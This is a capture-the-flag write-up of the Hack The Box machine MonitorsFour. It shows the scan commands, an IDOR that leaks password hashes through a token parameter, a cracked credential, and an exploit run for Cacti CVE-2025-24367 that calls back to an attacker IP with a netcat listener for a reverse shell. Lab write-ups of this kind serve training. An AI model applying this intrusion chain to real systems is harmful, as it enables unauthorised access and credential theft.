<img width="1342" height="786" alt="image" src="https://github.com/user-attachments/assets/a2f4f663-6a39-41a6-ae89-e6aea0c81a59" /># MonitorFour-Write-UP : Hack The Box

<img width="850" height="628" alt="image" src="https://github.com/user-attachments/assets/6d04c533-1ce2-48f9-a153-ec5cf05f4244" /> 

# Description 

# Overview
 MonitorsFour is an Easy difficulty Windows machine on Hack The Box that focuses on:

Web Enumeration
IDOR Vulnerability Exploitation
Credential Harvesting
Cacti Exploitation
Docker Container Escape
Privilege Escalation

The machine teaches how multiple small vulnerabilities can be chained together to achieve full system compromise.


USER.TXT 


• Enumeration : Scan Port using nmap 
	
    CMD : nmap -sS <IP>
<img width="616" height="213" alt="image" src="https://github.com/user-attachments/assets/906faba9-29ad-4ba9-96dc-ee591c06b242" />

Http - 80 
WinRM - 5985
	
 Explore Webpage : But not Open because it is Resolve to = monitorsfour.htb
	
We can set IP and Domain name in /etc/hosts File.
<img width="571" height="303" alt="image" src="https://github.com/user-attachments/assets/6dd6a80d-dd1a-417b-b790-8b6cc0ac8b14" />

Explore Again Http Web pages : In this Web Page Found Login Page


<img width="1547" height="799" alt="image" src="https://github.com/user-attachments/assets/7358059b-d465-4982-a647-036e5c9faa3a" />

Identify Subdomains : Using TOOL = FFUF
	
    CMD :  ffuf -u http://monitorsfour.htb -H 'Host: FUZZ.monitorsfour.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -fs 138


<img width="1337" height="488" alt="image" src="https://github.com/user-attachments/assets/bcaed13a-899f-4184-b837-b9c7a226b582" />

SUBDOMAIN : cacti 
	
• Explore This Subdomain and Add In /etc/hosts file :



  


	
Founded This Login Page and this Login page Version
	
Version : 1.2.28
	
Directory Busting : Using Tool = Gobuster 
	
    CMD :  gobuster dir -u http://monitorsfour.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt   -t 20 







See these Pages on = monitorsfour.htb URL
	
• Check User Page :  




  
Missing Parameter Error 
	
Try to ADD Token Parameter 
	
/user?token=0


  

	
Found a users Credential - Name , ID , HASH, Email, Role , etc. Details
	
Analys Super User Role : Copy Password Hash 
	
• Crack Password in Some Websites : crack station , Hashes.com 
	
Hashes.com 


  

	
Username = Admin 
Password = Wonderful1
  
• Login with monitorsfour.htb/login page :  


  

	
Login Success Ful
	
 Login With cacti.monitorsfour.htb/cacti : 
	
Username : marcus
	Password : wonderful1
	

	

	
Login Success Ful
	
	
	
• Find Version Exploit : on Browsers 
	
Version : 1.2.28


  

	
We Found This Exploit - Cybergeek
	
- CVE-2025-24367
	
	- Download Code - Exploit.py
	- Make it Executable 
	- Run with this Command : 
	
	ATTACKER
  CMD : python3 exploit.py -u marcus -p wonderful1 -i <ATTACKER-IP> -l 1234 -url http://cacti.monitorsfour.htb
	
- Before this Command Start Listening on Netcap
	
  ATTACKER
    
    CMD : nc -nlvp 1234
	


	
ACCESS Successful : With User.txt
	
	
	
USER.TXT---------------------------------------------------------------FLAG{}-------------------------------------------------------------------------

